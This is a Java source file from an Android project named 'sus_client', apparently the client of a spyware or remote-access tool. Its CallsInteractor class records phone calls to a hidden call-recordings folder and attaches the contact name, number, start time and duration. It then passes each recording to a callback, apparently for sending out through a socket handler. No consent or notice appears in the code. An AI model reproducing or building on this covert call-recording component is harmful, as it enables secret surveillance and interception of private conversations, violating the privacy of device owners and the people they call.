package com.android.sus_client.background.calls;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Build;

import com.android.sus_client.services.SocketHandler;
import com.android.sus_client.commonutility.basic.Function1;
import com.android.sus_client.commonutility.basic.Invoker;
import com.android.sus_client.commonutility.cache.BaseRootFiles;
import com.android.sus_client.commonutility.cache.RootFilesManager;
import com.android.sus_client.utils.AudioRecorderUtils;
import com.android.sus_client.utils.FileUtil;

import java.io.File;

public class CallsInteractor {

    private final Context context;

    public CallsInteractor(Context context) {
        this.context = context;
    }

    private final AudioRecorderUtils recorder = new AudioRecorderUtils(() -> {
        deleteFile();
        return null;
    });

    private File mFile;
    private String contactName;
    private long startTime;
    private String phoneNumber;
    private int type;

    public void startRecording(String phoneNumber, int type) {
        this.startTime = System.currentTimeMillis();
        this.phoneNumber = phoneNumber;
        this.type = type;

        contactName = SocketHandler.getContactName(context, phoneNumber);
        mFile = RootFilesManager.createOrGetNewFile(context, BaseRootFiles.DirType.CALL_RECORDINGS, "", phoneNumber);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            recorder.startRecording(MediaRecorder.AudioSource.VOICE_COMMUNICATION, mFile.getAbsolutePath());
        } else {
            recorder.startRecording(MediaRecorder.AudioSource.VOICE_CALL, mFile.getAbsolutePath());
        }
    }

    public void stopRecording(Function1<Void, CallRecordingModel> sendRecording) {
        recorder.stopRecording(() -> {
            long duration = FileUtil.getDurationFile(mFile.getAbsolutePath());
            CallRecordingModel recording = new CallRecordingModel(contactName, phoneNumber, startTime, duration, type, mFile.getAbsolutePath());
            sendRecording.invoke(new Invoker<>(recording));
            return null;
        });
    }

    public boolean isRecording() {
        return recorder.isRecording();
    }

    public void deleteFile() {
        boolean isDeleted = true;
        if (mFile.exists()) {
            isDeleted = mFile.delete();
        }
        System.out.println(isDeleted);
    }

}